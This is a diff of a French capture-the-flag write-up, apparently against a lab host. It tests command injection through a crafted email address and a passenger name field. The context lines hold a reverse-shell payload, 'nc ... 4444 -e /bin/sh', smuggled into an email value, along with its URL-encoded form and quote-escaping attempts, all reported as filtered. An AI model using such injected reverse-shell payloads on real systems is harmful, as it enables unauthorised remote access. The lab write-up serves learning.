@@ -91,7 +91,7 @@ On peut alors se créer un nouveau compte avec une adresse email spéciale, pour
 john.doe@gmail.com; nc 10.10.14.158 4444 -e /bin/sh
 john%2Edoe%40gmail%2Ecom%3B%20nc%2010%2E10%2E14%2E158%204444%20%2De%20%2Fbin%2Fsh
 ```
-L'adresse craftée n'est pas acceptée.
+L'adresse craftée n'est pas acceptée. On ne peut pas non plus modifier l'adresse mail dans le profil.
 On d'avoir le même résultat avec le nom indiqué pour le passager, avec un échappement par `john"john` ; filtré également. On essaie avec `john%2522john` :
 ```POST
 full_name=john%2522john
@@ -100,3 +100,4 @@ id_type=national_id
 id_number=6616116
 ```
 Mais on obtient juste `john%22john` dans le JSON.
+
